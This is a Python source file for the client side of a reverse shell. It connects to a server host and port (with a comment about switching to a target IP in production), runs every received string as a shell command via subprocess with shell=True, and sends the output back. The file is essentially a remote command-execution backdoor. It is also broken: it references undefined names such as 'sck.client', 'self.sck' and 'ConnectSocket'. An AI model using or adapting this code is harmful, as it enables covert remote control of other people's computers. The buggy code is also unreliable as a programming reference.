import socket
import os
import subprocess
import sys
from dataclasses import dataclass
from typing import Any


@dataclass
class ConnectServer():
    """ Main class that creates a socket on the Client """

    BUFFER_SIZE: int = 1024
    host: str = "localhost"
    port: int = 9999
    sck_client: Any = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # def __init__(self, host="localhost"):
    # # Change to <target-ip> on production with different computers
    # BUFFER_SIZE = 1024
    # self.host = host
    # self.port = 9999

    def __post_init__(self):
        try:

            # self.sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sck.client.connect((self.host, self.port))

        except socket.error as msg:

            print(f"[!] Socket connection error: {msg}")

        while True:
            # Receives data from server

            data = self.sck_client.recv(self.BUFFER_SIZE)

            try:

                if data[:2].decode("utf-8") == "cd":
                    if data[3:].decode("utf-8") != "":
                        os.chdir(data[3:].decode("utf-8"))

            except FileNotFoundError:

                print("[-] No such file or directory")

            if data[:].decode("utf-8") == "quit":
                print("[-] Server quit")
                self.sck.close()
                sys.exit()

            if len(data) > 0:
                cmd = subprocess.Popen(data[:].decode("utf-8"),
                                       shell=True,
                                       stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE,
                                       universal_newlines=True)

                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes)

                current_wd = os.getcwd() + " >> "

                # Sends data to the server

                self.sck.send(str.encode(output_str + current_wd))

                print(f"[+] Client says: {output_str}")


if __name__ == "__main__":
    sck = ConnectSocket()
